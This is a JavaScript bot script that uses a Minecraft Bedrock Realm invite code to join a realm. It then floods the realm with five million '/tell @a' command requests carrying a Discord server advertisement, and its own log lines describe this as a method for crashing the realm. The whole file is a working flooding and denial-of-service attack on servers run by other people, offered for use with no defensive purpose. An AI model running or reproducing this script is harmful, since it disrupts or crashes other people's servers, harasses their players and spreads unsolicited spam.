const { Authflow } = require("prismarine-auth");
const { RealmAPI } = require("prismarine-realms");
const { createClient } = require("bedrock-protocol");

const REALM_INVITE_CODE = "8drAX9_QUWY"; // realm code yk
const SPAM_MESSAGE = "§0§lOPP ON TOP? .gg/mh3N369C§0§lOPP ON TOP? .gg/mh3N369C§0§lOPP ON TOP? .gg/mh3N369C";
const SPAM_COUNT = 5000000; // very op spam last 7373373773years without being in da realm

async function spamRealm() {
  try {
    const flow = new Authflow("", "auth_cache"); // dw abt ts
    const api = RealmAPI.from(flow, "bedrock");
    console.log();
    
    // skibiddi join thing or idk
    const realm = REALM_INVITE_CODE.length < 10 
      ? await api.getRealm(REALM_INVITE_CODE) 
      : await api.getRealmFromInvite(REALM_INVITE_CODE);
    
    // info stuff this is for it lookim cool yk?
    console.log("[BOT] Info below ")
    console.log("====================");
    console.log(`Name: ${realm.name}`);
    console.log(`ID: ${realm.id}`);
    console.log(`Owner: ${realm.owner}`);
    console.log(`Players: ${realm.players?.length || 0}/${realm.maxPlayers}`);
    console.log(`State: ${realm.state}`);
    console.log(`Expired: ${realm.expired}`);
    console.log(`Days Left: ${realm.daysLeft}`);
    console.log(`Game Version: ${realm.version}`);
    console.log(`Active Version: ${realm.activeVersion}`);
    console.log(`World Type: ${realm.worldType}`);
    console.log("=========================");
    console.log();
    
    console.log(`Joining Realm: ${realm.name} (ID: ${realm.id})`);
    console.log(`Starting client...`);
    
    const client = createClient({
      username: "", // dw
      profilesFolder: "auth_cache",
      realms: { realmId: realm.id },
      skipPing: true, // dw
    });

    client.once("play_status", () => {
      console.log("[BOT] https://discord.gg/mh3N369C")
      console.log("[BOT] Crash Method By termed__again on discord!");
      console.log("[BOT] Crashing Realm Now")
      
      // cmd request thingy
      console.log();
      for (let i = 0; i < SPAM_COUNT; i++) {
        client.queue("command_request", {
          command: `/tell @a ${SPAM_MESSAGE}`,
          internal: false,
          version: 76,
          origin: { type: 5, uuid: "0", request_id: "29" },
        });
      }
      console.log();
    });

    client.on("error", (err) => {
      console.error("[BOT] Client Error >:", err.message);
    });

    client.on("close", () => {
      console.log("[BOT] Disconnected from realm >");
    });

  } catch (err) {
    console.error("[BOT] Initialization Failed >:", err.message);
  }
}

spamRealm();